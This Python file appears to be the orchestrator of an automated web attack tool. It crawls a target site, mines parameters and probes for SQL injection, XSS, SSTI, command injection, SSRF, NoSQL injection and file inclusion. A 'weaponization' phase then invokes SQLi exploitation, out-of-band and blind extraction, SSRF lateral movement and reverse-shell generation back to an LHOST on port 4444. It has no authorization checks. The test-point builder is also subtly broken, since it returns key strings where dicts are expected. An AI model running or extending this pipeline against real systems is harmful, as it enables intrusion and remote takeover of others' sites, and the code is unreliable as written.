import json, time, sys, os, threading, concurrent.futures
from typing import Dict, List, Optional, Tuple

try:
    from tools import crawler, param_miner
    from tools import sql_injection, xss_detector, ssti_detector, cmdi_detector
    from tools import ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass
    from tools import sqli_weaponizer, jwt_exploiter, ssrf_lateral
    from tools import sqli_blind, sqli_oob, reverse_shell
except ImportError:
    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
    from tools import crawler, param_miner
    from tools import sql_injection, xss_detector, ssti_detector, cmdi_detector
    from tools import ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass
    from tools import sqli_weaponizer, jwt_exploiter, ssrf_lateral
    from tools import sqli_blind, sqli_oob, reverse_shell

SKIP_PARAMS = {"submit", "button", "reset", "image", "file", "action",
               "_method", "_token", "utf8", "commit", "form_id", "form_build_id",
               "form_token", "authenticity_token"}

DETECTOR_MAP = [
    ("sqli", lambda u, p, s, t: sql_injection.check(u, p, s, t)),
    ("xss", lambda u, p, s, t: xss_detector.check(u, p, s, t)),
    ("ssti", lambda u, p, s, t: ssti_detector.check(u, p, s, t)),
    ("cmdi", lambda u, p, s, t: cmdi_detector.check(u, p, s, t)),
    ("ssrf", lambda u, p, s, t: ssrf_detector.check(u, p, s, t)),
    ("nosqli", lambda u, p, s, t: nosqli_detector.check(u, p, s, t)),
    ("lfi", lambda u, p, s, t: lfi_scanner.check(u, p, s, t)),
]


class Orchestrator:
    def __init__(self, target: str,
                 sess: Optional['requests.Session'] = None, timeout: float = 10.0,
                 threads: int = 10, max_pages: int = 30, max_depth: int = 2):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.sess = sess
        self.threads = threads
        self.max_pages = max_pages
        self.max_depth = max_depth
        self.state = {
            "phases": {},
            "vulnerabilities": [],
            "exploits": [],
            "summary": {},
        }

    def phase_crawl(self) -> Dict:
        result = crawler.crawl(self.target, max_depth=self.max_depth,
                                max_pages=self.max_pages, sess=self.sess,
                                timeout=self.timeout)
        self.state["phases"]["crawl"] = result
        return result

    def phase_mine(self, crawl_result: Dict = None) -> Dict:
        if crawl_result is None:
            crawl_result = self.state["phases"].get("crawl", {})
        endpoints = crawl_result.get("endpoints", {})
        if not endpoints:
            endpoints = {"/": {"url": self.target, "methods": ["GET"], "params": []}}
        result = param_miner.mine(self.target, endpoints, self.sess,
                                   self.timeout, self.threads)
        self.state["phases"]["param_mine"] = result
        return result

    def _build_test_points(self) -> List[Dict]:
        points = []
        crawl_data = self.state["phases"].get("crawl", {})
        mine_data = self.state["phases"].get("param_mine", {})
        seen = set()
        all_params = set(crawl_data.get("parameters", []))

        for path_data in mine_data.values():
            if isinstance(path_data, dict):
                for p in path_data.get("all_params", []):
                    all_params.add(p)

        for path, info in crawl_data.get("endpoints", {}).items():
            url = info.get("url", "%s%s" % (self.target, path))
            for p in set(info.get("params", []) + list(all_params)[:5]):
                if p.lower() in SKIP_PARAMS:
                    continue
                key = "%s|%s|GET" % (url, p)
                if key not in seen:
                    seen.add(key)
                    points.append({"url": url, "param": p, "method": "GET"})

        for path, pd in mine_data.items():
            if not isinstance(pd, dict):
                continue
            url = "%s%s" % (self.target, path)
            mined = set(p["param"] for p in pd.get("get_params", [])
                       if p.get("status", 404) not in (0, 404, 400))
            mined |= set(p["param"] for p in pd.get("post_params", [])
                        if p.get("status", 404) not in (0, 404, 400))
            for p in mined:
                if p.lower() in SKIP_PARAMS:
                    continue
                key = "%s|%s|GET" % (url, p)
                if key not in seen:
                    seen.add(key)
                    points.append({"url": url, "param": p, "method": "GET"})

        return list(seen)[:150]

    def _test_single_point(self, point: Dict) -> List[Dict]:
        url = point["url"]
        param = point["param"]
        results = []
        import requests
        raw_sess = self.sess or requests.Session()

        for vtype, fn in DETECTOR_MAP:
            try:
                r = fn(url, param, raw_sess, self.timeout)
                if isinstance(r, dict):
                    vuln = r.get("vulnerable") or r.get("total_bypasses", 0) > 0
                    if vuln:
                        results.append({
                            "type": vtype,
                            "url": url,
                            "param": param,
                            "result": r,
                        })
            except:
                pass
        return results

    def phase_detect(self) -> Dict:
        points = self._build_test_points()
        print("  -> %d test points across %d detectors" % (len(points), len(DETECTOR_MAP)))
        all_findings = {}
        lock = threading.Lock()
        done = [0]
        total = len(points)

        def worker(point):
            findings = self._test_single_point(point)
            with lock:
                for f in findings:
                    key = "%s|%s|%s" % (f["type"], f["url"], f["param"])
                    all_findings[key] = f
                done[0] += 1
                if done[0] % 5 == 0 or done[0] == total:
                    print("    \r    progress: %d/%d (found %d)" % (
                        done[0], total, len(all_findings)), end="", flush=True)

        if self.threads > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                list(ex.map(worker, points))
        else:
            for p in points:
                worker(p)
        print()
        self.state["phases"]["detect"] = {
            "test_points": total,
            "findings": all_findings,
        }
        return all_findings

    def phase_weaponize(self) -> Dict:
        findings = self.state["phases"].get("detect", {}).get("findings", {})
        exploits = {}
        import requests
        raw_sess = self.sess or requests.Session()

        def _weaponize_one(key, finding):
            vtype = finding["type"]
            url = finding["url"]
            param = finding["param"]
            result = {}
            if vtype == "sqli":
                try:
                    result["sqli_weaponizer"] = sqli_weaponizer.check(url, param, raw_sess, self.timeout)
                except:
                    pass
                try:
                    result["sqli_blind"] = sqli_blind.check(url, param, raw_sess, self.timeout)
                except:
                    pass
                try:
                    result["sqli_oob"] = sqli_oob.check(url, param, "oob.local", raw_sess, self.timeout)
                except:
                    pass
            if vtype == "ssrf":
                try:
                    result["ssrf_lateral"] = ssrf_lateral.run(url, param, sess=raw_sess, timeout=self.timeout)
                except:
                    pass
            if vtype == "lfi":
                v = finding.get("result", {})
                if v.get("rce_available"):
                    try:
                        result["shells"] = reverse_shell.run("LHOST", 4444, "raw")["shells"]
                    except:
                        pass
            if vtype == "xss":
                from tools import xss_validator
                try:
                    result["xss_validated"] = xss_validator.check(url, param, raw_sess, self.timeout)
                except:
                    pass
            if result:
                return key, result
            return None, None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(_weaponize_one, k, f): k for k, f in findings.items()}
            for future in concurrent.futures.as_completed(futures):
                k, r = future.result()
                if k and r:
                    exploits[k] = r
        self.state["phases"]["weaponize"] = exploits
        return exploits

    def phase_report(self) -> Dict:
        report = {
            "target": self.target,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "summary": {},
            "details": {},
        }
        detection = self.state["phases"].get("detect", {})
        findings = detection.get("findings", {})
        exploits = self.state["phases"].get("weaponize", {})

        by_type = {}
        for key, f in findings.items():
            vt = f["type"]
            if vt not in by_type:
                by_type[vt] = []
            by_type[vt].append(f)

        by_url = {}
        for f in findings.values():
            u = f["url"]
            if u not in by_url:
                by_url[u] = []
            by_url[u].append(f["type"])

        report["summary"]["vulnerabilities"] = len(findings)
        report["summary"]["by_type"] = {k: len(v) for k, v in by_type.items()}
        report["summary"]["by_url"] = {k: len(v) for k, v in by_url.items()}
        report["summary"]["exploit_ready"] = len(exploits)
        report["summary"]["critical"] = any(
            f.get("result", {}).get("rce_available")
            or f.get("result", {}).get("rce")
            for f in findings.values()
        )
        report["summary"]["affected_urls"] = list(by_url.keys())
        report["summary"]["param_hits"] = [
            "%s?%s [%s]" % (f["url"], f["param"], f["type"])
            for f in findings.values()
        ]

        for vt, flist in by_type.items():
            report["details"][vt] = flist
        report["exploits"] = exploits

        crawl_summary = self.state["phases"].get("crawl", {}).get("summary", {})
        mine_data = self.state["phases"].get("param_mine", {})
        total_mined = sum(
            len(pd.get("all_params", []))
            for pd in mine_data.values()
            if isinstance(pd, dict)
        )
        report["recon"] = {
            "pages_crawled": crawl_summary.get("pages_crawled", 0),
            "endpoints": crawl_summary.get("endpoints_found", 0),
            "forms": crawl_summary.get("forms_found", 0),
            "params_crawled": crawl_summary.get("unique_params", 0),
            "params_mined": total_mined,
            "test_points": detection.get("test_points", 0),
        }
        self.state["phases"]["report"] = report
        return report

    def run(self) -> Dict:
        start = time.time()
        print("[*] Phase 1/4: Crawling %s ..." % self.target)
        crawl_result = self.phase_crawl()
        cs = crawl_result.get("summary", {})
        print("  -> %d pages, %d endpoints, %d params" % (
            cs.get("pages_crawled", 0), cs.get("endpoints_found", 0),
            cs.get("unique_params", 0)))

        print("[*] Phase 2/4: Parameter mining ...")
        mine_result = self.phase_mine(crawl_result)
        total_mined = sum(
            len(pd.get("all_params", []))
            for pd in mine_result.values()
            if isinstance(pd, dict)
        )
        print("  -> %d params discovered across %d endpoints" % (
            total_mined, len(mine_result)))

        print("[*] Phase 3/4: Vulnerability detection (%d threads) ..." % self.threads)
        findings = self.phase_detect()
        by_type = {}
        for f in findings.values():
            by_type.setdefault(f["type"], 0)
            by_type[f["type"]] += 1
        by_type_str = " ".join("[%s:%d]" % (k.upper(), v) for k, v in sorted(by_type.items()))
        print("  -> %d vulnerabilities found: %s" % (len(findings), by_type_str))

        if findings:
            print("[*] Phase 4/4: Weaponization (%d threads) ..." % self.threads)
            exploits = self.phase_weaponize()
            print("  -> %d exploit paths prepared" % len(exploits))

        report = self.phase_report()
        report["elapsed_seconds"] = round(time.time() - start, 1)
        self.state["report"] = report
        return report


def run(target: str, sess: Optional['requests.Session'] = None,
        timeout: float = 10.0, threads: int = 10) -> Dict:
    o = Orchestrator(target, sess, timeout, threads)
    return o.run()
